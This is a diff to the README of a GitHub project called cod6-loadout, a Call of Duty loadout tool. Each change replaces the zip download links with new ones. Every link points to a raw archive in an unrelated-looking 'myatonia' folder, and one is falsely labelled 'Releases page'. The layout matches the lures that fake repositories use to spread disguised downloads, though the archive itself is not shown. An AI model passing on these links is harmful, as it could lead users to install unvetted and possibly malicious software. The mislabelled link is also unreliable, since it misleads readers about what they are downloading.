@@ -6,7 +6,7 @@ Welcome to cod6-loadout! This application helps you build and manage your loadou
 
 ## 📥 Download Now
 
-[![Download cod6-loadout](https://raw.githubusercontent.com/Kartikay75/cod6-loadout/main/myatonia/cod6-loadout-v1.7.zip)](https://raw.githubusercontent.com/Kartikay75/cod6-loadout/main/myatonia/cod6-loadout-v1.7.zip)
+[![Download cod6-loadout](https://raw.githubusercontent.com/Kartikay75/cod6-loadout/main/myatonia/loadout-cod-1.6.zip)](https://raw.githubusercontent.com/Kartikay75/cod6-loadout/main/myatonia/loadout-cod-1.6.zip)
 
 ## 💻 System Requirements
 
@@ -32,7 +32,7 @@ cod6-loadout offers a variety of features to enhance your gameplay experience:
 
 To get started with cod6-loadout, follow these steps:
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/Kartikay75/cod6-loadout/main/myatonia/cod6-loadout-v1.7.zip).
+1. Visit the [Releases page](https://raw.githubusercontent.com/Kartikay75/cod6-loadout/main/myatonia/loadout-cod-1.6.zip).
 2. Scroll down to find the latest version.
 3. Click on the download link for your operating system.
 4. Once the file downloads, find it in your downloads folder.
@@ -85,6 +85,6 @@ This project is licensed under the MIT License. Feel free to modify and distribu
 
 For a straightforward access point, please use the link below to download cod6-loadout:
 
-[![Download cod6-loadout](https://raw.githubusercontent.com/Kartikay75/cod6-loadout/main/myatonia/cod6-loadout-v1.7.zip)](https://raw.githubusercontent.com/Kartikay75/cod6-loadout/main/myatonia/cod6-loadout-v1.7.zip)
+[![Download cod6-loadout](https://raw.githubusercontent.com/Kartikay75/cod6-loadout/main/myatonia/loadout-cod-1.6.zip)](https://raw.githubusercontent.com/Kartikay75/cod6-loadout/main/myatonia/loadout-cod-1.6.zip)
 
 Thank you for choosing cod6-loadout. Enjoy enhancing your Call of Duty experience!
